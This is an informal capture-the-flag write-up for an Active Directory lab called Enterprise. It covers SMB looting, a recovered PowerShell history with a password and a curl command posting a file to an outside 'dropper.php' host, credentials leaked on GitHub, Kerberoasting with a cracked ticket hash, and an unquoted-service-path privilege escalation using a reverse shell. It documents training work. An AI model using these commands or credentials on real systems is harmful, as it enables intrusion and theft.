
```
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 126 Simple DNS Plus
80/tcp   open  http          syn-ack ttl 126 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2025-12-31 20:51:41Z)
135/tcp  open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 126
464/tcp  open  kpasswd5?     syn-ack ttl 126
593/tcp  open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 126
3268/tcp open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 126
3389/tcp open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| ssl-cert: Subject: commonName=LAB-DC.LAB.ENTERPRISE.THM
| Issuer: commonName=LAB-DC.LAB.ENTERPRISE.THM
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-12-30T20:49:03
| Not valid after:  2026-07-01T20:49:03
| MD5:   774b:9238:b813:dcb1:20c5:de8c:7f8b:7bd7
| SHA-1: 5b6e:843c:05c3:4f94:c622:61c5:5cff:e6f8:1c2f:dd31
| -----BEGIN CERTIFICATE-----
| MIIC9jCCAd6gAwIBAgIQdMMKAAyAcp5J5RuGaZNWnDANBgkqhkiG9w0BAQsFADAk
| MSIwIAYDVQQDExlMQUItREMuTEFCLkVOVEVSUFJJU0UuVEhNMB4XDTI1MTIzMDIw
| NDkwM1oXDTI2MDcwMTIwNDkwM1owJDEiMCAGA1UEAxMZTEFCLURDLkxBQi5FTlRF
| UlBSSVNFLlRITTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALp5DJxa
| C8Cx8Wdg8BPzP2Py4YYG4WEJU1MdzUdOORSmZAqzKLRQ3i0F87M5K06fKXum2h2i
| u67xRqFy5K1H2GZqfqy70Rpn4PJbuNCoLApNJIhUWHXn/9e61ekOU/lNNb5Iwsg4
| 3l7GSnEJwiX4x02Qm1zoKwhQYOC2N5AwXoyyMV428hSrCSqwH2DhUnSFXnrltgdb
| 9NXO7vEk/n0DkORFkrEh7zehKrIu6by7QcEBKuE1/0eBDYfqfdBCBFf+6HIpqGph
| a03lQULb8/hXKt7crmXyUqVIzIIEL1FxtocFzqOtBGVrTg2yfRYX8leaLA4Q6M8z
| TzFbzRCBIum9yRUCAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0P
| BAQDAgQwMA0GCSqGSIb3DQEBCwUAA4IBAQB0ne66ItJoBv0JSU5kYQ21B8fx626j
| 7tgjgZJaberFnlYoohpAqDSiCj65JStgTUTl0qp/CXS2fBPJC5j/UE9tdionsr2B
| kQ+yQAT8wmsemiWQNQy2PhjzqUO9vAECGV9FDI8CwVln+j6nVltAh38SgPNZidet
| XfnoPgHCY6K/qO/nYN2ktACXr/OsNTRuGuMx6bronXyDmtIjS3By5nexugnAryNV
| NSfdnzm6NSzBIH/AiB5PTxD5tycMW2/ilF2vluItudSjC3/7VKF99HGUZYpzxABC
| 2MxMEYmKDbnUwXVqGncMbGMpCtoN/aEOdNnTNi8tTBiDE/HNpdZj6zfZ
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: LAB-ENTERPRISE
|   NetBIOS_Domain_Name: LAB-ENTERPRISE
|   NetBIOS_Computer_Name: LAB-DC
|   DNS_Domain_Name: LAB.ENTERPRISE.THM
|   DNS_Computer_Name: LAB-DC.LAB.ENTERPRISE.THM
|   DNS_Tree_Name: ENTERPRISE.THM
|   Product_Version: 10.0.17763
|_  System_Time: 2025-12-31T20:52:07+00:00
|_ssl-date: 2025-12-31T20:52:17+00:00; +1s from scanner time.
5985/tcp open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: LAB-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-12-31T20:52:10
|_  start_date: N/A
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 49749/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 57603/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 12565/udp): CLEAN (Failed to receive data)
|   Check 4 (port 28463/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked


```

```
10.64.146.225 enterprice.thm lab.enterprice.thm lab-dc.enterprice.thm

```

```
└─$ smbclient \\\\10.64.146.225\\Users
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> passive
passive: command not found
smb: \> ls
  .                                  DR        0  Thu Mar 11 21:11:49 2021
  ..                                 DR        0  Thu Mar 11 21:11:49 2021
  Administrator                       D        0  Thu Mar 11 16:55:48 2021
  All Users                       DHSrn        0  Sat Sep 15 03:28:48 2018
  atlbitbucket                        D        0  Thu Mar 11 17:53:06 2021
  bitbucket                           D        0  Thu Mar 11 21:11:51 2021
  Default                           DHR        0  Thu Mar 11 19:18:03 2021
  Default User                    DHSrn        0  Sat Sep 15 03:28:48 2018
  desktop.ini                       AHS      174  Sat Sep 15 03:16:48 2018
  LAB-ADMIN                           D        0  Thu Mar 11 19:28:14 2021
  Public                             DR        0  Thu Mar 11 16:27:02 2021


```

to get all data include that smb use special cmds

```
smbclient \\\\10.64.146.225\\Users
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> lcd /home/kali/tryhackme/enterprice
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
getting file \desktop.ini of size 174 as desktop.ini (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
NT_STATUS_ACCESS_DENIED listing \Administrator\*


```

after got all data from smb my file dir look like this 

```
└─$ tree                                                                                                                                    
.
├── Administrator
├── All Users
├── atlbitbucket
├── bitbucket
├── Default
│   ├── AppData
│   │   ├── Local
│   │   │   ├── Application Data
│   │   │   ├── History
│   │   │   ├── Microsoft
│   │   │   │   ├── InputPersonalization
│   │   │   │   │   └── TrainedDataStore
│   │   │   │   ├── Windows
│   │   │   │   │   ├── CloudStore
│   │   │   │   │   ├── GameExplorer
│   │   │   │   │   ├── History
│   │   │   │   │   ├── INetCache
│   │   │   │   │   ├── INetCookies
│   │   │   │   │   ├── Shell
│   │   │   │   │   │   └── DefaultLayouts.xml
│   │   │   │   │   ├── Temporary Internet Files
│   │   │   │   │   └── WinX
│   │   │   │   │       ├── Group1
│   │   │   │   │       │   ├── 1 - Desktop.lnk
│   │   │   │   │       │   └── desktop.ini
│   │   │   │   │       ├── Group2
│   │   │   │   │       │   ├── 1 - Run.lnk
│   │   │   │   │       │   ├── 2 - Search.lnk
│   │   │   │   │       │   ├── 3 - Windows Explorer.lnk
│   │   │   │   │       │   ├── 4 - Control Panel.lnk
│   │   │   │   │       │   ├── 5 - Task Manager.lnk
│   │   │   │   │       │   └── desktop.ini
│   │   │   │   │       └── Group3
│   │   │   │   │           ├── 01a - Windows PowerShell.lnk
│   │   │   │   │           ├── 01 - Command Prompt.lnk
│   │   │   │   │           ├── 02a - Windows PowerShell.lnk
│   │   │   │   │           ├── 02 - Command Prompt.lnk
│   │   │   │   │           ├── 03 - Computer Management.lnk
│   │   │   │   │           ├── 04-1 - NetworkStatus.lnk
│   │   │   │   │           ├── 04 - Disk Management.lnk
│   │   │   │   │           ├── 05 - Device Manager.lnk
│   │   │   │   │           ├── 06 - SystemAbout.lnk
│   │   │   │   │           ├── 07 - Event Viewer.lnk
│   │   │   │   │           ├── 08 - PowerAndSleep.lnk
│   │   │   │   │           ├── 09 - Mobility Center.lnk
│   │   │   │   │           ├── 10 - AppsAndFeatures.lnk
│   │   │   │   │           └── desktop.ini
│   │   │   │   ├── WindowsApps
│   │   │   │   └── Windows Sidebar
│   │   │   │       ├── Gadgets
│   │   │   │       └── settings.ini
│   │   │   ├── Temp
│   │   │   └── Temporary Internet Files
│   │   └── Roaming
│   │       └── Microsoft
│   │           ├── Internet Explorer
│   │           │   └── Quick Launch
│   │           │       ├── Control Panel.lnk
│   │           │       ├── desktop.ini
│   │           │       ├── Server Manager.lnk
│   │           │       ├── Shows Desktop.lnk
│   │           │       └── Window Switcher.lnk
│   │           └── Windows
│   │               ├── CloudStore
│   │               ├── Network Shortcuts
│   │               ├── Powershell
│   │               ├── Printer Shortcuts
│   │               ├── Recent
│   │               ├── SendTo
│   │               │   ├── Compressed (zipped) Folder.ZFSendToTarget
│   │               │   ├── Desktop (create shortcut).DeskLink
│   │               │   ├── Desktop.ini
│   │               │   └── Mail Recipient.MAPIMail
│   │               ├── Start Menu
│   │               │   └── Programs
│   │               │       ├── Accessibility
│   │               │       │   ├── desktop.ini
│   │               │       │   ├── Magnify.lnk
│   │               │       │   ├── Narrator.lnk
│   │               │       │   └── On-Screen Keyboard.lnk
│   │               │       ├── Accessories
│   │               │       │   ├── desktop.ini
│   │               │       │   └── Notepad.lnk
│   │               │       ├── Maintenance
│   │               │       │   └── Desktop.ini
│   │               │       ├── Startup
│   │               │       │   └── RunWallpaperSetupInit.cmd
│   │               │       ├── System Tools
│   │               │       │   ├── Administrative Tools.lnk
│   │               │       │   ├── Command Prompt.lnk
│   │               │       │   ├── computer.lnk
│   │               │       │   ├── Control Panel.lnk
│   │               │       │   ├── Desktop.ini
│   │               │       │   ├── File Explorer.lnk
│   │               │       │   └── Run.lnk
│   │               │       └── Windows PowerShell
│   │               └── Templates
│   ├── Application Data
│   ├── Cookies
│   ├── Desktop
│   ├── Documents
│   │   ├── My Music
│   │   ├── My Pictures
│   │   └── My Videos
│   ├── Downloads
│   ├── Favorites
│   ├── Links
│   ├── Local Settings
│   ├── Music
│   ├── My Documents
│   ├── NetHood
│   ├── Pictures
│   ├── PrintHood
│   ├── Recent
│   ├── Saved Games
│   ├── SendTo
│   ├── Start Menu
│   ├── Templates
│   └── Videos
├── Default User
├── desktop.ini
├── LAB-ADMIN
│   ├── AppData
│   │   ├── Local
│   │   │   ├── Microsoft
│   │   │   │   ├── Credentials
│   │   │   │   │   └── DFBE70A7E5CC19A398EBF1B96859CE5D
│   │   │   │   ├── InputPersonalization
│   │   │   │   │   └── TrainedDataStore
│   │   │   │   ├── Windows
│   │   │   │   │   ├── CloudStore
│   │   │   │   │   ├── GameExplorer
│   │   │   │   │   ├── History
│   │   │   │   │   ├── INetCache
│   │   │   │   │   ├── INetCookies
│   │   │   │   │   ├── Shell
│   │   │   │   │   │   └── DefaultLayouts.xml
│   │   │   │   │   ├── UsrClass.dat{3aac7186-82b4-11eb-a88a-000c29379b0a}.TM.blf
│   │   │   │   │   ├── UsrClass.dat{3aac7186-82b4-11eb-a88a-000c29379b0a}.TMContainer00000000000000000001.regtrans-ms
│   │   │   │   │   ├── UsrClass.dat{3aac7186-82b4-11eb-a88a-000c29379b0a}.TMContainer00000000000000000002.regtrans-ms
│   │   │   │   │   └── WinX
│   │   │   │   │       ├── Group1
│   │   │   │   │       │   ├── 1 - Desktop.lnk
│   │   │   │   │       │   └── desktop.ini
│   │   │   │   │       ├── Group2
│   │   │   │   │       │   ├── 1 - Run.lnk
│   │   │   │   │       │   ├── 2 - Search.lnk
│   │   │   │   │       │   ├── 3 - Windows Explorer.lnk
│   │   │   │   │       │   ├── 4 - Control Panel.lnk
│   │   │   │   │       │   ├── 5 - Task Manager.lnk
│   │   │   │   │       │   └── desktop.ini
│   │   │   │   │       └── Group3
│   │   │   │   │           ├── 01a - Windows PowerShell.lnk
│   │   │   │   │           ├── 01 - Command Prompt.lnk
│   │   │   │   │           ├── 02a - Windows PowerShell.lnk
│   │   │   │   │           ├── 02 - Command Prompt.lnk
│   │   │   │   │           ├── 03 - Computer Management.lnk
│   │   │   │   │           ├── 04-1 - NetworkStatus.lnk
│   │   │   │   │           ├── 04 - Disk Management.lnk
│   │   │   │   │           ├── 05 - Device Manager.lnk
│   │   │   │   │           ├── 06 - SystemAbout.lnk
│   │   │   │   │           ├── 07 - Event Viewer.lnk
│   │   │   │   │           ├── 08 - PowerAndSleep.lnk
│   │   │   │   │           ├── 09 - Mobility Center.lnk
│   │   │   │   │           ├── 10 - AppsAndFeatures.lnk
│   │   │   │   │           └── desktop.ini
│   │   │   │   ├── WindowsApps
│   │   │   │   └── Windows Sidebar
│   │   │   │       ├── Gadgets
│   │   │   │       └── settings.ini
│   │   │   └── Temp
│   │   └── Roaming
│   │       └── Microsoft
│   │           ├── Credentials
│   │           ├── Crypto
│   │           │   └── RSA
│   │           │       └── S-1-5-21-2168718921-3906202695-65158103-1000
│   │           │           └── 83aa4cc77f591dfc2374580bbd95f6ba_baebb989-4cb7-4d0b-89c2-ad186800b0f6
│   │           ├── Internet Explorer
│   │           │   └── Quick Launch
│   │           │       ├── Control Panel.lnk
│   │           │       ├── desktop.ini
│   │           │       ├── Server Manager.lnk
│   │           │       ├── Shows Desktop.lnk
│   │           │       └── Window Switcher.lnk
│   │           ├── Protect
│   │           │   ├── CREDHIST
│   │           │   └── S-1-5-21-2168718921-3906202695-65158103-1000
│   │           │       ├── 655a0446-8420-431a-a5d7-2d18eb87b9c3
│   │           │       └── Preferred
│   │           ├── SystemCertificates
│   │           │   └── My
│   │           │       ├── AppContainerUserCertRead
│   │           │       ├── Certificates
│   │           │       ├── CRLs
│   │           │       └── CTLs
│   │           └── Windows
│   │               ├── CloudStore
│   │               ├── Network Shortcuts
│   │               ├── Powershell
│   │               │   └── PSReadline
│   │               │       └── Consolehost_hisory.txt
│   │               ├── Printer Shortcuts
│   │               ├── Recent
│   │               ├── SendTo
│   │               │   ├── Compressed (zipped) Folder.ZFSendToTarget
│   │               │   ├── Desktop (create shortcut).DeskLink
│   │               │   ├── Desktop.ini
│   │               │   └── Mail Recipient.MAPIMail
│   │               ├── Start Menu
│   │               │   └── Programs
│   │               │       ├── Accessibility
│   │               │       │   ├── Desktop.ini
│   │               │       │   ├── Magnify.lnk
│   │               │       │   ├── Narrator.lnk
│   │               │       │   └── On-Screen Keyboard.lnk
│   │               │       ├── Accessories
│   │               │       │   ├── desktop.ini
│   │               │       │   └── Notepad.lnk
│   │               │       ├── Maintenance
│   │               │       │   └── Desktop.ini
│   │               │       ├── System Tools
│   │               │       │   ├── Administrative Tools.lnk
│   │               │       │   ├── Command Prompt.lnk
│   │               │       │   ├── computer.lnk
│   │               │       │   ├── Control Panel.lnk
│   │               │       │   ├── Desktop.ini
│   │               │       │   ├── File Explorer.lnk
│   │               │       │   └── Run.lnk
│   │               │       └── Windows PowerShell
│   │               │           ├── desktop.ini
│   │               │           ├── Windows PowerShell ISE.lnk
│   │               │           ├── Windows PowerShell ISE (x86).lnk
│   │               │           ├── Windows PowerShell.lnk
│   │               │           └── Windows PowerShell (x86).lnk
│   │               └── Templates
│   ├── Desktop
│   ├── Documents
│   ├── Downloads
│   ├── Favorites
│   ├── Links
│   ├── Music
│   ├── Pictures
│   ├── Saved Games
│   └── Videos
└── Public

136 directories, 111 files

```

Found something 

```
cat Consolehost_hisory.txt
cd C:\
mkdir monkey
cd monkey
cd ..
cd ..
cd ..
cd D:
cd D:
cd D:
D:\
mkdir temp
cd temp
echo "replication:101RepAdmin123!!">private.txt
Invoke-WebRequest -Uri http://1.215.10.99/payment-details.txt
more payment-details.txt
curl -X POST -H 'Cotent-Type: ascii/text' -d .\private.txt' http://1.215.10.99/dropper.php?file=itsdone.txt
del private.txt
del payment-details.txt
cd ..
del temp
cd C:\
C:\
exit                                                                                                                                         
```

```
The user `LAB-ADMIN` was creating a text file containing credentials.

- **Potential User:** `replication` (or possibly `LAB-ADMIN` reusing the password)
    
- **Potential Password:** `101RepAdmin123!!`
```

```
smbclient //10.64.146.225/Users -U "LAB-ADMIN"
Password for [WORKGROUP\LAB-ADMIN]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Thu Mar 11 21:11:49 2021
  ..                                 DR        0  Thu Mar 11 21:11:49 2021
  Administrator                       D        0  Thu Mar 11 16:55:48 2021
  All Users                       DHSrn        0  Sat Sep 15 03:28:48 2018
  atlbitbucket                        D        0  Thu Mar 11 17:53:06 2021
  bitbucket                           D        0  Thu Mar 11 21:11:51 2021
  Default                           DHR        0  Thu Mar 11 19:18:03 2021
  Default User                    DHSrn        0  Sat Sep 15 03:28:48 2018
  desktop.ini                       AHS      174  Sat Sep 15 03:16:48 2018
  LAB-ADMIN                           D        0  Thu Mar 11 19:28:14 2021
  Public                             DR        0  Thu Mar 11 16:27:02 2021

                15587583 blocks of size 4096. 9929808 blocks available

smb: \LAB-ADMIN\> lcd /home/kali/tryhackme/enterprice/labadmin
smb: \LAB-ADMIN\> recurse ON
smb: \LAB-ADMIN\> prompt OFF
smb: \LAB-ADMIN\> mget *

└─$ tree                                                                                                                                    
.
├── AppData
│   ├── Local
│   │   ├── Microsoft
│   │   │   ├── Credentials
│   │   │   │   └── DFBE70A7E5CC19A398EBF1B96859CE5D
│   │   │   ├── InputPersonalization
│   │   │   │   └── TrainedDataStore
│   │   │   ├── Windows
│   │   │   │   ├── CloudStore
│   │   │   │   ├── GameExplorer
│   │   │   │   ├── History
│   │   │   │   ├── INetCache
│   │   │   │   ├── INetCookies
│   │   │   │   ├── Shell
│   │   │   │   │   └── DefaultLayouts.xml
│   │   │   │   ├── UsrClass.dat{3aac7186-82b4-11eb-a88a-000c29379b0a}.TM.blf
│   │   │   │   ├── UsrClass.dat{3aac7186-82b4-11eb-a88a-000c29379b0a}.TMContainer00000000000000000001.regtrans-ms
│   │   │   │   ├── UsrClass.dat{3aac7186-82b4-11eb-a88a-000c29379b0a}.TMContainer00000000000000000002.regtrans-ms
│   │   │   │   └── WinX
│   │   │   │       ├── Group1
│   │   │   │       │   ├── 1 - Desktop.lnk
│   │   │   │       │   └── desktop.ini
│   │   │   │       ├── Group2
│   │   │   │       │   ├── 1 - Run.lnk
│   │   │   │       │   ├── 2 - Search.lnk
│   │   │   │       │   ├── 3 - Windows Explorer.lnk
│   │   │   │       │   ├── 4 - Control Panel.lnk
│   │   │   │       │   ├── 5 - Task Manager.lnk
│   │   │   │       │   └── desktop.ini
│   │   │   │       └── Group3
│   │   │   │           ├── 01a - Windows PowerShell.lnk
│   │   │   │           ├── 01 - Command Prompt.lnk
│   │   │   │           ├── 02a - Windows PowerShell.lnk
│   │   │   │           ├── 02 - Command Prompt.lnk
│   │   │   │           ├── 03 - Computer Management.lnk
│   │   │   │           ├── 04-1 - NetworkStatus.lnk
│   │   │   │           ├── 04 - Disk Management.lnk
│   │   │   │           ├── 05 - Device Manager.lnk
│   │   │   │           ├── 06 - SystemAbout.lnk
│   │   │   │           ├── 07 - Event Viewer.lnk
│   │   │   │           ├── 08 - PowerAndSleep.lnk
│   │   │   │           ├── 09 - Mobility Center.lnk
│   │   │   │           ├── 10 - AppsAndFeatures.lnk
│   │   │   │           └── desktop.ini
│   │   │   ├── WindowsApps
│   │   │   └── Windows Sidebar
│   │   │       ├── Gadgets
│   │   │       └── settings.ini
│   │   └── Temp
│   └── Roaming
│       └── Microsoft
│           ├── Credentials
│           ├── Crypto
│           │   └── RSA
│           │       └── S-1-5-21-2168718921-3906202695-65158103-1000
│           │           └── 83aa4cc77f591dfc2374580bbd95f6ba_baebb989-4cb7-4d0b-89c2-ad186800b0f6
│           ├── Internet Explorer
│           │   └── Quick Launch
│           │       ├── Control Panel.lnk
│           │       ├── desktop.ini
│           │       ├── Server Manager.lnk
│           │       ├── Shows Desktop.lnk
│           │       └── Window Switcher.lnk
│           ├── Protect
│           │   ├── CREDHIST
│           │   └── S-1-5-21-2168718921-3906202695-65158103-1000
│           │       ├── 655a0446-8420-431a-a5d7-2d18eb87b9c3
│           │       └── Preferred
│           ├── SystemCertificates
│           │   └── My
│           │       ├── AppContainerUserCertRead
│           │       ├── Certificates
│           │       ├── CRLs
│           │       └── CTLs
│           └── Windows
│               ├── CloudStore
│               ├── Network Shortcuts
│               ├── Powershell
│               │   └── PSReadline
│               │       └── Consolehost_hisory.txt
│               ├── Printer Shortcuts
│               ├── Recent
│               ├── SendTo
│               │   ├── Compressed (zipped) Folder.ZFSendToTarget
│               │   ├── Desktop (create shortcut).DeskLink
│               │   ├── Desktop.ini
│               │   └── Mail Recipient.MAPIMail
│               ├── Start Menu
│               │   └── Programs
│               │       ├── Accessibility
│               │       │   ├── Desktop.ini
│               │       │   ├── Magnify.lnk
│               │       │   ├── Narrator.lnk
│               │       │   └── On-Screen Keyboard.lnk
│               │       ├── Accessories
│               │       │   ├── desktop.ini
│               │       │   └── Notepad.lnk
│               │       ├── Maintenance
│               │       │   └── Desktop.ini
│               │       ├── System Tools
│               │       │   ├── Administrative Tools.lnk
│               │       │   ├── Command Prompt.lnk
│               │       │   ├── computer.lnk
│               │       │   ├── Control Panel.lnk
│               │       │   ├── Desktop.ini
│               │       │   ├── File Explorer.lnk
│               │       │   └── Run.lnk
│               │       └── Windows PowerShell
│               │           ├── desktop.ini
│               │           ├── Windows PowerShell ISE.lnk
│               │           ├── Windows PowerShell ISE (x86).lnk
│               │           ├── Windows PowerShell.lnk
│               │           └── Windows PowerShell (x86).lnk
│               └── Templates
├── Desktop
├── Documents
├── Downloads
├── Favorites
├── Links
├── Music
├── Pictures
├── Saved Games
└── Videos

62 directories, 62 files

```

so nothing usefull , to be a usefull i use kerbrute to find usernames 

```

```

I again scan all ports using nmap and find something

```
7990/tcp open  http    Microsoft IIS httpd 10.0
|_http-title: Log in to continue - Log in with Atlassian account
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

this `7990` port website login page telling `Reminder to all Enterprise-THM Employees: We are moving to Github!`  So I dork google againest github `site:github.com ""Enterprise-THM"`
 So there is git repo also belong to room creator 

so  in that repo has some user and that user have repo and that repo history commit give something valuble info 

```
Import-Module ActiveDirectory
$userName = 'nik'
$userPassword = 'ToastyBoi!'
$psCreds = ConvertTo-SecureString $userPassword -AsPlainText -Force
$Computers = New-Object -TypeName "System.Collections.ArrayList"
$Computer = $(Get-ADComputer -Filter * | Select-Object Name)
for ($index = -1; $index -lt $Computer.count; $index++) { Invoke-Command -ComputerName $index {systeminfo} }
```

have a valid domain creds, enumerate basic info using `rcpclient`

```
└─$ rpcclient 10.64.146.225 -U nik     
Password for [WORKGROUP\nik]:
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[atlbitbucket] rid:[0x3e8]
user:[bitbucket] rid:[0x452]
user:[nik] rid:[0x453]
user:[replication] rid:[0x454]
user:[spooks] rid:[0x455]
user:[korone] rid:[0x456]
user:[banana] rid:[0x457]
user:[Cake] rid:[0x458]
user:[contractor-temp] rid:[0x45c]
user:[varg] rid:[0x45d]
user:[joiner] rid:[0x45f]
rpcclient $> enumdomgroups
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[DnsUpdateProxy] rid:[0x44f]
group:[Password-Policy-Exemption] rid:[0x459]
group:[Contractor] rid:[0x45a]
group:[sensitive-account] rid:[0x45b]
group:[adobe-subscription] rid:[0x45e]

```

using kerbrute and rcpclient i create users list 

```
Administrator
Guest
krbtgt
atlbitbucket
bitbucket
nik
replication
spooks
korone
banana
Cake
contractor-temp
varg
joiner
LAB-ADMIN
```


```
└─$ GetUserSPNs.py lab.enterprise.thm/nik:ToastyBoi!
/home/kali/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name       MemberOf                                                     PasswordLastSet             LastLogon                   Delegation 
--------------------  ---------  -----------------------------------------------------------  --------------------------  --------------------------  ----------
HTTP/LAB-DC           bitbucket  CN=sensitive-account,CN=Builtin,DC=LAB,DC=ENTERPRISE,DC=THM  2021-03-11 20:20:01.333272  2021-04-26 11:16:41.570158             




```

```
└─$ GetUserSPNs.py lab.enterprise.thm/nik:ToastyBoi! -request
/home/kali/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name       MemberOf                                                     PasswordLastSet             LastLogon                   Delegation 
--------------------  ---------  -----------------------------------------------------------  --------------------------  --------------------------  ----------
HTTP/LAB-DC           bitbucket  CN=sensitive-account,CN=Builtin,DC=LAB,DC=ENTERPRISE,DC=THM  2021-03-11 20:20:01.333272  2021-04-26 11:16:41.570158             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*bitbucket$LAB.ENTERPRISE.THM$lab.enterprise.thm/bitbucket*$9b0b484bd18f616683947f5543f6b689$7b2161d3a6d9ea143d59e412be15265322a16d9d75400f03e2932b2a1ada41de8d97fb538781b1a346bf429f26da648a9e9a89c5c55854ddb5d2bfc0639b2e5f4eceb495d9ffaa57df2a571c14f3d2cd235aae808b84d5810df91200a7e60956b0e4a9e512434d0255b84a25dcf60ed67f72ac10920d76274e4d948b47e5a8f6518fe067d41e9af961850ab8425512a1d1c4186d700afecb7917a0179158da4498d6c8f0e7f63bdbbdc7106457f3f0ab6f903a02a429eb09e9f1945fc49bd30c1780f954c7c557140794ad5ac3eb3c085e5d8a41494718939a5465f97c3ca62ba45e3ec1e4959341f0996d358110a6fa11fe432cca01172c50c20d82a3420a736ff12f25bded41fc59b800c10819dc60c15f31f5fa22dd2bef8ac8358bf538a90c00168d9157c629b9547c5b83baf089f7bd0082f1bcd246cbfecb661500bfba25c2e8bfe042d27c04746f34aa62faf1fe2c2cb64ce6d7e793bf1a2815d10d84e44528e203e72ad44f93a800e3f4ee576dff0b3ae784c7b82b2f5d7a276c16ed7a153e8dbcc539dd698fe73dfbd3c650d0ae5a18c9a18f7fa0a6ec471da2624c7b1d5f0d2619d7b0ac8c7d510093379dd2bf1c7aad9270741413b63877bb3714f3020463bd3e716dd44d3f996441691800ff8406bfaaefdca4f5ce4fc2d3996aa6ea7e8bbc8c027fe7214b1b7e27c673017ed95dd79420397889a9f9932d7ff0244617a810685d26d7d7a2d895130d4602d95a3f3b280a8949cf7f976f5ba9d11e3e977b3e508e676e9bc036f67bc4bb77894f3d564e4498c2fc3fcc2d6baf6c85abb196e86c5875c31592ecd0d60e....................

```

```
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
littleredbucket  (?)     
1g 0:00:00:01 DONE (2025-12-31 17:45) 0.8620g/s 1354Kp/s 1354Kc/s 1354KC/s livelifecool..liss4life
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                  
```

now I have credentials i use remmina to login and you have 1st flag

so to get root i put winpease into that `found that one service’s binary path has no double quotes.`

Create reverse shell using msfvenom and upload into that path and catch reverse shell using msfconsle or netcat you got root flag

THM{1a1fa94875421.......................}